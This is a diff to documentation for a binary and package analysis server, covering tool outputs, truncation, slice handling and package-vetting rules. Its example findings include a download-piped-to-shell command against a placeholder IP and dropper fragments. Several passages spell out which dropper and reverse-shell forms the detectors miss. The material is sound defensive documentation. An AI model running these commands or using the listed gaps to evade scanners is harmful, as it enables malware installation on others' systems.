@@ -229,13 +229,19 @@ Notes:
    `{tool, arguments, gives}`: send `tool` and `arguments` as written; `gives` says what the call returns. There is
    no other key for the explanation and no plain-string step. Steps in section answers and in `all: true` also carry
    `other_lists` when the section has more than one list, and the `disassembly` step (of `sections: ["disassembly"]`
-   and of `all: true`) carries a nested `then` step. The tools that return `next_steps` are `analyze_file`, `disassemble`, `compare_files`, `search_strings`,
-   `cache_status`, `analyze_document` and `analyze_script` (inside `summary`), `inspect_archive`, `analyze_java_file`
-   and the two package tools. `query_analysis`, `read_hex`, `string_details`, `llm_analyze_file`, `yara_scan_file` and
-   `cache_clear` have none. Advice that is not a call is not a step: `cache_status` and `search_strings` put it in
-   `hint`, and `inspect_archive` puts it in `summary.notes`. The overview of a `.tar.gz` offers both package steps
-   and that of a `.tgz` only the `analyze_npm_package` step, by the file name and without looking inside: their
-   `gives` says the call is an error when the archive is not that kind of package.
+   and of `all: true`) carries a nested `then` step. The tools that return `next_steps` are `analyze_file`,
+   `disassemble`, `compare_files`, `search_strings`, `cache_status`, `analyze_document` and `analyze_script` (inside
+   `summary`), `inspect_archive`, `analyze_java_file` and the two package tools. `query_analysis`, `read_hex`,
+   `string_details`, `llm_analyze_file`, `yara_scan_file` and `cache_clear` have none. Advice that is not a call is
+   not a step: `cache_status` and `search_strings` put it in `hint`, and `inspect_archive` puts it in
+   `summary.notes`. The overview offers a specialist step only when the call would work as written. For a script
+   it names `analyze_script` only for Shell, PowerShell, JavaScript, Python, Batch and VBScript, decided from the
+   `#!` line first and then the extension: a Perl, Ruby, PHP, Lua or AWK script gets no such step, and neither does
+   a `.sh` file whose shebang names Perl (a call by hand still rates that one as shell). For a zip it leaves out
+   `inspect_archive` when `format_details.archive.error` is present (the central directory could not be read). The
+   overview of a `.tar.gz` and that of a `.tgz` offer both package steps, `analyze_npm_package` and
+   `analyze_python_package`, by the file name and without looking inside: their `gives` says the call is an error
+   when the archive is not that kind of package.
 2. **One section.** Ask for a named section: `analyze_file` with `sections: ["symbols", "vulnerabilities"]`. Each
    section is computed in full, cached by the file's SHA-256 and returned as a short summary.
 3. **Read the items.** `query_analysis` pages and filters the lists inside a section (strings, imports,
@@ -267,6 +273,18 @@ Clients limit how much tool output they will inline: Claude Code warns above 10,
   `disassemble` listing carries a `note` and `next_address`); `analyze_file` section summaries (`sections` or
   `all: true`) that were reduced to counts say so in `note`; `compare_files` and `llm_analyze_file` list what was
   cut under `truncated`.
+- A `next_steps` entry is never shortened. At a small `max_output_bytes` the list is cut by whole steps: a step is
+  returned with its exact arguments or dropped. In the overview the drop is listed in `truncated.cut` with the path
+  `/next_steps` (`kept` is the number of steps left). An `analyze_file` answer whose section summaries were reduced to
+  counts (it says so in `note`, for example `all: true` at 4,000 bytes) drops steps without a `/next_steps` entry. The
+  top-level `file_path`, `package_path` or `path` echo is shortened only as a last resort, when nothing else is left to
+  cut; that cut is listed in `truncated.cut` too. Over a 4,000-byte budget, the overview of
+  `test_programs/c_advanced_binary` at a 470-character path keeps the path whole and loses its steps
+  (`{"path": "/next_steps", "kind": "array", "original": 5, "kept": 0}`, and it also keeps only 7 of its 8
+  `interesting_strings`, 6 under `--no-cache`), while `all: true` at a 909-character path on a
+  server started with `--no-cache` cuts the path to `"...[cut 909 of 909 bytes]"`
+  (`{"path": "/file_path", "kind": "string", "original": 909, "kept": 0}`); with the cache on, the start of the path is
+  kept, and how many bytes depends on the rest of the answer (60 to 64 in our runs).
 - Lists come back in pages (see below), so a large list is never sent whole.
 
 Real sizes, in characters of the default answer (test programs from this repository, section cache on):
@@ -436,23 +454,25 @@ With no section named, the answer is the overview:
 
 The overview adapts to the file. The first step names `["symbols", "threats"]` for a native binary and `["threats",
 "behavioral"]` for other files, including every Java and zip-based archive. `counts.imported_symbols` equals
-`format.imports_count`, and the imports step (`query_analysis`, section `binary_info`, list `imports`) is left out
-when there are none. A Java class file lists the native sections under `not_applicable` and gets no `disassemble` or
-imports step. A zip is never offered the native `symbols` and `threats` pair or a `disassemble` step (`disassemble` on
-one is an error). A `.jar`, `.war`, `.ear` or `.aar`, and a zip whose entries mark it as a Java archive (for example
-`WEB-INF/`), is reported as kind `jar` with the Java label (`Java web application archive (WAR)`) and gets an
-`analyze_java_file` step beside `inspect_archive`; a zip that only has `META-INF/application.xml` and is not named
-`.ear` stays a plain zip. A gzip stream that is not a tar gets no `inspect_archive` step. For a universal Mach-O,
-`type` lists the slices (`Mach-O universal binary (3 slices: x86_64, arm64e, arm64-subtype-12)`),
+`format.imports_count`, and the imports step (`query_analysis`, section `binary_info`, list `imports`) is left out when
+there are none. A Java class file lists the native sections under `not_applicable`, gets no `disassemble` or imports
+step and has no `counts.functions`, `counts.imported_symbols` or `counts.exported_symbols` (only the string counts). A
+zip is never offered the native `symbols` and `threats` pair or a `disassemble` step (`disassemble` on one is an error).
+A `.jar`, `.war`, `.ear` or `.aar`, and a zip whose entries mark it as a Java archive (for example `WEB-INF/`), is
+reported as kind `jar` with the Java label (`Java web application archive (WAR)`) and gets an `analyze_java_file` step
+beside `inspect_archive`; a zip that only has `META-INF/application.xml` and is not named `.ear` stays a plain zip. The
+overview of a Java archive (`.jar`, `.war`, `.ear`, `.aar`, `.apk`) has no `notes` entry for `symbols`: the sections
+that do not apply are under `not_applicable`. A gzip stream that is not a tar gets no `inspect_archive` step. For a
+universal Mach-O, `type` lists the slices (`Mach-O universal binary (3 slices: x86_64, arm64e, arm64-subtype-12)`),
 `format.analyzed_slice` names the one that was read (the host's, else the first), and when that slice is not x86,
 `control_flow`, `vulnerabilities` and `code_quality` are listed under `not_applicable` with a reason that names
-`disassemble` and, if the file has an x86 slice, `arch: "x86_64"`. `arch` accepts a slice name as the overview prints
-it (`x86_64`, `arm64e`, `arm64-subtype-12`), and also the older spellings `ARM64E` and `ARM64 (subtype 12)`, which the
+`disassemble` and, if the file has an x86 slice, `arch: "x86_64"`. `arch` accepts a slice name as the overview prints it
+(`x86_64`, `arm64e`, `arm64-subtype-12`), and also the older spellings `ARM64E` and `ARM64 (subtype 12)`, which the
 `binary_info` summary still prints under `universal_slices` (a count and a sample, not a pageable list). `arm64` and
-`aarch64` are accepted only when exactly one slice is ARM64-family; otherwise the error lists the slice names.
-Directory triage rows name the slices the same way as the overview. The `next_steps` of `disassemble` repeat the
-`arch` you passed; those of section answers name the same slice in lower case (`arm64-subtype-12` comes back as
-`arm64 (subtype 12)`, which `arch` also accepts).
+`aarch64` pick the slice named `arm64` when the file has one, else the only ARM64-family slice; when several slices are
+ARM64-family and none is named `arm64`, the error lists the slice names. Directory triage rows name the slices the same
+way as the overview. The `next_steps` of `disassemble` repeat the `arch` you passed; those of section answers spell the
+slice as the overview does (`"arch": "arm64-subtype-12"`, never `arm64 (subtype 12)`).
 
 With sections or `all: true`, each section comes back as a summary (counts, headline numbers, a few top items) at the
 top level, plus `errors` (sections that failed), `notes` (sections that do not apply, with the reason), `next_steps`
@@ -524,12 +544,14 @@ words`. A match without these keys is full evidence:
                 "description": "Detects anti-analysis and anti-VM techniques" } }
 ```
 
-Two built-in rules are narrower than their names: `persistence_mechanisms` does not match the word `schtasks` alone
-(it needs `schtasks /create`, or the word next to a `CurrentVersion\Run` key), and `backdoor_patterns` flags a Python
-reverse shell only when `os.dup2(`, `/bin/sh` or `pty.spawn(`, `socket.socket(` and `.connect(` are all present. A
-file that holds the full set, such as a tutorial with complete code, is still rated Suspicious with the `Backdoor`
-classification; a text file that holds only some of them does not match the rule, and a text file that only says
-`reverse shell` or `bind shell` is listed as weak.
+Two built-in rules are narrower than their names: `persistence_mechanisms` does not match the word `schtasks` alone (it
+needs the command that creates a task, or the word anywhere in a file that also names the Windows Run registry key),
+and `backdoor_patterns` flags a Python reverse shell only when the file holds all four strings the rule looks for: a
+socket constructor, a connect call, a dup2 call and either the path of `sh` or a pty spawn. One dup2 call onto any
+descriptor is enough; the rule does not check that the three standard descriptors are redirected. A file that holds
+the full set, such as a tutorial with complete code, is still rated Suspicious with the `Backdoor` classification; a
+text file that holds only some of the four does not match the rule, and a text file that only says `reverse shell` or
+`bind shell` is listed as weak.
 
 The threats and enhanced_threats sections are stored with a revision in their cache key: results that an earlier
 build stored are recomputed, not served.
@@ -582,25 +604,25 @@ With `function: "main", max_instructions: 5`:
 }
 ```
 
-Limits: `disassemble` works on an ELF, a PE, a thin Mach-O, or one slice of a universal Mach-O. Pick the slice with
-`arch`. A PE is decoded as x86, x86-64 or ARM64 by its COFF machine (`0x14c`, `0x8664`, `0xaa64`); an ARM64 PE reports
-`architecture: "ARM64"` and lists 4-byte ARM64 instructions, and so do the `disassembly` section of `analyze_file` and
-the opcodes of `llm_analyze_file`. Any other machine value is an error that names it
-(`Unsupported PE machine 0x1c0; supported: x86 (0x14c), x86-64 (0x8664), ARM64 (0xaa64). The architecture is not
-supported`). A PE without function symbols has an empty function list (`total: 0`): pass `address`, for example the
-entry point. A bounded part of the disassembly (the first 20,000 instructions) is cached; code outside it is decoded
-again on every call, which takes about a second on a large file. The answer says so in `window_note` and carries
-`cache: "partial"`. A function is found by any function name in the symbol table, also on a file with more than 5,000
-functions: its listing is the symbol's range and `function.listed_from` says it came from the symbol table. An
-imported name has no code to list and is refused, and so is a substring that matches more than one function (the error
-lists them). A name that no function has is an error that also says the symbol table has none. Following
-`next_address` of such a listing continues past the symbol's end, because an address lists from that instruction on.
-An address outside the decoded range is an error that says where the listing is: "No instruction at 0x10 in this
-file's disassembly (the next one is at 0x1460)", then "The listing holds 773 rows in 0x1460..0x20c9 (instructions, and
-a `.byte` row for each byte that could not be decoded); addresses outside that range are not listed, and read_hex shows
-the raw bytes there." `total_instructions` counts decoded instructions. A listing of a range also counts `.byte` rows
-for bytes that could not be decoded, so the two can differ by that count (3,767 against 3,881 on the x86_64 slice of
-`/bin/ls`).
+Limits: `disassemble` works on an ELF, a PE, a thin Mach-O, or one slice of a universal Mach-O (the tool description in
+`tools/list` says `ELF, Mach-O or PE (x86, x86-64, ARM64)`). Pick the slice with `arch`. A PE is decoded as x86, x86-64
+or ARM64 by its COFF machine (`0x14c`, `0x8664`, `0xaa64`); an ARM64 PE reports `architecture: "ARM64"` and lists 4-byte
+ARM64 instructions, and so do the `disassembly` section of `analyze_file` and the opcodes of `llm_analyze_file`. Any
+other machine value is an error that names it (`Unsupported PE machine 0x1c0; supported: x86 (0x14c), x86-64 (0x8664),
+ARM64 (0xaa64). The architecture is not supported`). A PE without function symbols has an empty function list (`total:
+0`): pass `address`, for example the entry point. A bounded part of the disassembly (the first 20,000 instructions) is
+cached; code outside it is decoded again on every call, which takes about a second on a large file. The answer says so
+in `window_note` and carries `cache: "partial"`. A function is found by any function name in the symbol table, also on a
+file with more than 5,000 functions: its listing is the symbol's range and `function.listed_from` says it came from the
+symbol table. An imported name has no code to list and is refused, and so is a substring that matches more than one
+function (the error lists them). A name that no function has is an error that also says the symbol table has none.
+Following `next_address` of such a listing continues past the symbol's end, because an address lists from that
+instruction on. An address outside the decoded range is an error that says where the listing is: "No instruction at 0x10
+in this file's disassembly (the next one is at 0x1460)", then "The listing holds 773 rows in 0x1460..0x20c9
+(instructions, and a `.byte` row for each byte that could not be decoded); addresses outside that range are not listed,
+and read_hex shows the raw bytes there." `total_instructions` counts decoded instructions. A listing of a range also
+counts `.byte` rows for bytes that could not be decoded, so the two can differ by that count (3,767 against 3,881 on the
+x86_64 slice of `/bin/ls`).
 
 ### read_hex
 
@@ -821,7 +843,9 @@ PDF categories: `action`, `script`, `link`, `launch`, `submit`, `attachment`, `e
     "risk": { "level": "critical", "score": 65,
               "reasons": ["JavaScript present (1 reference(s))", "OpenAction runs when the document opens", ...] },
     "feature_counts": { "JS": 1, "JavaScript": 1, "OpenAction": 1 },
-    "next_steps": [ { "tool": "analyze_document", "arguments": { "file_path": "...", "category": "script" },
+    "next_steps": [ { "tool": "analyze_document", "arguments": { "file_path": "...", "category": "action" },
+                      "gives": "each risky name with byte offsets" },
+                    { "tool": "analyze_document", "arguments": { "file_path": "...", "category": "script" },
                       "gives": "the JavaScript" }, ... ]
   },
   "findings": { "items": [ { "category": "script", "severity": "high", "offset": 206, "object": 4, "length": 13,
@@ -991,11 +1015,13 @@ Vet a local npm package. The tool is offline: it never downloads anything.
   "input": { "kind": "tarball", "manifest": "package/package.json", "files_total": 2, "files_scanned": 1, ... },
   "risk": { "level": "Critical", "score": 100.0,
             "reasons": ["1 known-malicious pattern(s): Suspicious network activity",
+                        "dynamic code execution of decoded or dynamic content",
+                        "4 finding(s) in source files (see section findings)",
                         "an install-time script runs suspicious code: Download piped to a shell or interpreter (scripts.postinstall)",
                         "1 known vulnerability(ies) in dependencies (0 critical, 1 high)", ...] },
   "findings": { "total": 4, "by_severity": { "critical": 1, "high": 2, "medium": 1, "low": 0 },
     "top": [
-      { "rule": "Download piped to a shell or interpreter", "severity": "Critical",
+      { "rule": "Download piped to a shell or interpreter", "category": "download-exec", "severity": "Critical",
         "file": "package/package.json#scripts.postinstall", "line": 1,
         "evidence": "curl -s http://203.0.113.7/p.sh | sh" },
       { "rule": "Private key or cloud credential file", "severity": "High", "file": "package/index.js", ... },
@@ -1031,15 +1057,30 @@ What raises the rating, in both package tools:
 - A run counts as the run of a download only when it starts what was written. It is tied to the write when it names
   the same variable, the same field (`this.path`, `self.path`), the same expression written again
   (`path.join(os.tmpdir(), name)`) or, inside a `+` expression, a string literal of the path
-  (`exec('/tmp/x.sh' + ' -q')`), or when its command is a shell, an interpreter or `chmod` (`sh`, `bash`, `node`,
-  `python`, `chmod`) held in a variable or joined with `+` (`spawn(shell, [...])`, `exec('sh ' + dest)`). A command
-  held in a variable is followed one assignment back, wherever in the file the assignment is (before the run). A run
-  whose first argument is a call (`cp.execFile(path.join(os.tmpdir(), name))`) is seen as a run. A call whose first
-  argument is only a plain string literal (`spawn('/tmp/agent')`, `spawn('sh', ['/tmp/x.sh'])`,
-  `exec('sh /tmp/x.sh')`, `subprocess.run(['/tmp/agent'])`) is not seen as a run, so a dropper written that way is
-  not caught by this rule. The exception is a literal `chmod +x` (`exec('chmod +x /tmp/x.sh')`,
-  `spawn('chmod', ['+x', '/tmp/x.sh'])`, `os.system('chmod +x /tmp/x.sh')`), which counts as the run. A generic runner that starts whatever it is given
-  (`spawn(command, args)`), next to a write of an unrelated cache file, is not a finding.
+  (`exec('/tmp/x.sh' + ' -q')`, `exec('sh -c ' + '/tmp/agent')`), or when its command is a shell, an interpreter or
+  `chmod` (`sh`, `bash`, `node`, `python`, `chmod`) held in a variable or joined with `+` (`spawn(shell, [...])`,
+  `exec('sh ' + dest)`). A command held in a variable is followed one assignment back, wherever in the file the
+  assignment is (before the run). A run whose first argument is a call (`cp.execFile(path.join(os.tmpdir(),
+  name))`) is seen as a run.
+- A run whose first argument is a plain quoted literal is not seen as a run in JavaScript or in a Python file other than
+  `setup.py`, so a dropper written that way is not caught: `spawn('/tmp/agent')`, `exec('/tmp/agent -q')`, `exec` of a
+  template literal, `spawn('sh', ['/tmp/agent'])`, `spawn('sh', [dest])` and `exec('sh /tmp/agent')` after a write of
+  that file (`fs.writeFileSync('/tmp/agent', ...)` or of `dest`) leave the package at Safe (with the Medium
+  `Process execution module` finding only), and so does `urlretrieve(url, '/tmp/agent')` followed by
+  `subprocess.run(['/tmp/agent'])` in a Python module (with the Medium `Process execution` finding only). The exception
+  is a literal `chmod +x`
+  (`exec('chmod +x /tmp/x.sh')`, `spawn('chmod', ['+x', '/tmp/x.sh'])`, `os.system('chmod +x /tmp/x.sh')`), which counts
+  as the run even for another path. In `setup.py` a literal run is seen when the write also names its path as a literal:
+  `urlretrieve(url, '/tmp/agent')` followed by `subprocess.run(['/tmp/agent'])`, `subprocess.run('/tmp/agent')` or
+  `os.system('/tmp/agent')` is a High `Download written to disk and run`, and so are `os.system('./run.sh')`, a literal
+  temp path that is a different file (`os.system('/tmp/other')`), a shell or interpreter with fixed arguments
+  (`subprocess.run(['sh', '-c', 'echo hi'])`, `subprocess.run(['python3', 'x.py'])`) and
+  `os.system('chmod +x /tmp/other')`. When the `setup.py` write holds its path in a variable
+  (`d = '/tmp/agent'; urlretrieve(url, d)`), a literal list `subprocess.run(['/tmp/agent'])` is not tied to it, while
+  `subprocess.run([d])` is. Fixed commands that start something else are not tied to a write (`git status` and
+  `npm run build` in JavaScript; `git status`, `ls`, `npm run build` and `/usr/bin/git status` in Python, `setup.py`
+  included), and neither is a generic runner that starts whatever it is given (`spawn(command, args)`) beside a write of
+  an unrelated cache file.
 - High 'Decoded payload passed to process execution' (category `obfuscation`): `exec`, `execSync`, `spawn` or
   `spawnSync` given a base64 or hex `Buffer`, `atob` or `String.fromCharCode` (JavaScript), and `os.system`,
   `os.popen` or `subprocess.*` given `b64decode`, `fromhex`, `unhexlify` or `codecs.decode` (Python).
@@ -1110,7 +1151,12 @@ What the caches hold, and where.
 `next_steps` are `{tool, arguments, gives}` objects; advice that is not a call is in `hint`. The analysis history is
 stored in the cache directory, so every server that uses the same directory reads and writes the same history. With
 `--allow-root`, `list` and `search` show only entries whose stored path is inside a root, and a step that names a file
-names a visible one. The `stats` action is not filtered: its counts (history entries and files, calls by tool,
+names a visible one. The rows print the canonical path (symlinks and `..` resolved): a file stored as
+`<D>/outside_zone/../in/a.bin` is listed as `<D>/in/a.bin`, in `file_path`, in `tool_args` (also for a long path that
+the history stores in cut form) and in the `search_strings` step, and `file_path_pattern` matches that printed path, so
+`outside` finds nothing there. Other path arguments in a listed row (keys ending in `path`, such as the `rule_path` of
+`yara_scan_file`) show in the same canonical spelling, or as `<outside the allowed roots>` when they lie outside the
+roots. The `stats` action is not filtered: its counts (history entries and files, calls by tool,
 section and string totals) include entries of files outside the roots, and name no path.
 
 ### cache_clear
@@ -1462,10 +1508,12 @@ curl -s -X POST http://127.0.0.1:3000/tools/call -H 'Content-Type: application/j
 ```
 
 `--allow-root` applies to these routes as it does to the tools: `/cache/list`, `/cache/search`, `/strings/search`,
-`/strings/details`, `/strings/filter` and `/strings/stats` show only entries and strings of files inside a root.
-`/cache/stats` and the totals of `/strings/stats` and `/strings/filter` are not filtered (see [The
-cache](#the-cache)). `POST /strings/details` answers HTTP 404 with `{"error":"String not found"}` for a string that is
-unknown or not visible, and the OpenAPI document lists 404 for that route.
+`/strings/details`, `/strings/related`, `/strings/filter` and `/strings/stats` show only entries and strings of files
+inside a root (`/strings/related` also drops related strings that live only outside the roots). The cache routes
+print each entry's canonical path, as `cache_status` does (see [The cache](#the-cache)). `/cache/stats` and the totals
+of `/strings/stats` and `/strings/filter` are not filtered. `POST /strings/details` answers HTTP 404 with
+`{"error":"String not found"}` for a string that is unknown or not visible, and the OpenAPI document lists 404 for that
+route.
 
 When `mcp-http` is stopped with Ctrl-C or SIGTERM it ends open streams and exits 0.
 
@@ -1508,9 +1556,14 @@ entries of files outside them:
 
 - Filtered by stored path: `cache_status` `list` and `search`, and REST `GET /cache/list` and `POST /cache/search`
   (an entry whose stored path is not inside a root, or no longer resolves inside one, is left out);
-  `search_strings` without `file_path`, `string_details`, and REST `POST /strings/search`, `/strings/details` and the
-  value lists of `GET /strings/stats` and `POST /strings/filter` (`most_common`) show only strings of files inside a
-  root.
+  `search_strings` without `file_path`, `string_details`, and REST `POST /strings/search`, `/strings/details`,
+  `/strings/related` and the value lists of `GET /strings/stats` and `POST /strings/filter` (`most_common`) show only
+  strings of files inside a root.
+- Printed by canonical path: on a rooted server the same listings (`cache_status` `list` and `search`, REST
+  `GET /cache/list` and `POST /cache/search`) show each row's `file_path` and `tool_args` with symlinks and `..`
+  resolved, so a `..` spelling stored by another server does not reveal a directory outside the roots. In REST
+  entries every result string equal to the stored path is printed the same way. `file_path_pattern` and the REST
+  `file_path_pattern` body field match the printed path.
 - Not filtered, and global: the counts and sizes of `cache_status` `stats` and REST `GET /cache/stats` (history
   entries, files, calls by tool, bytes, section and string totals) and the totals and distributions of
   `GET /strings/stats` and `POST /strings/filter`. They name no path and no string, but they include entries of files
